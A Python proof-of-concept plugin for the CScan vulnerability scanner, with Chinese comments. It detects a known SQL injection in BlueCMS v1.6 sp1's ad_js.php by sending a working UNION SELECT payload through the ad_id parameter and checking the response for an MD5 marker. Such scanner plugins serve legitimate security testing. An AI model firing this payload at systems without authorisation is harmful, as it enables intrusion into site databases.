# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'BlueCMS_0001'  # 平台漏洞编号，留空
    name = 'BlueCMS v1.6 sp1 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2010-08-03'  # 漏洞公布时间
    desc = '''
        BlueCMS(地方分类信息门户专用CMS系统)           
        $ad_id = !empty($_GET['ad_id']) ? trim($_GET['ad_id']) : ''; //根目录下其他文件都做了很好的过滤，
        对数字型变量几乎都用了intval()做限制，唯独漏了这个文件，居然只是用了trim()去除头尾空格。
        $ad = $db->getone("SELECT * FROM ".table('ad')." WHERE ad_id =".$ad_id); //直接代入查询。
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-20007'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'BlueCMS'  # 漏洞应用名称
    product_version = 'BlueCMS v1.6 sp1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '41077ddb-b022-44a5-88f7-0d9106f8a000'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/ad_js.php?ad_id=1%20and%201=2%20union%20select%201,2,3,4,5,md5(3.1415),md5(3.1415)"
            verify_url = self.target + payload
            content = requests.get(verify_url).text
            if '63e1f04640e83605c1d177544a5a0488' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name,url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
